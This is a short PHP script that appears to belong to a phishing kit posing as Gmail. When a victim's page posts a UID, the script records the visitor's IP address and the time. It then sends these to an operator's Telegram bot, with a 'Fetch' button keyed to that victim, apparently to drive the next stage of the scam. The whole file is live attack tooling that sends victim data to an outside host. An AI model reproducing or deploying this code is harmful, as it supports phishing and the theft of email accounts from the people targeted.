<?php
include('../data.php');

$uid  = trim($_POST['uid'] ?? '');
$ip   = '';
foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$date = date('d/m/Y H:i:s');

$msg  = "📧 GMAIL — NUEVA VISITA\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "🕒 Fecha: $date\n";
$msg .= "🔑 UID: $uid\n";

$keyboard = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '🔗 Fetch', 'callback_data' => "FETCH|$uid"],
        ]
    ]
]);

$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_POSTFIELDS     => http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => $keyboard,
    ]),
]);
curl_exec($ch);
curl_close($ch);

echo json_encode(['ok' => true]);
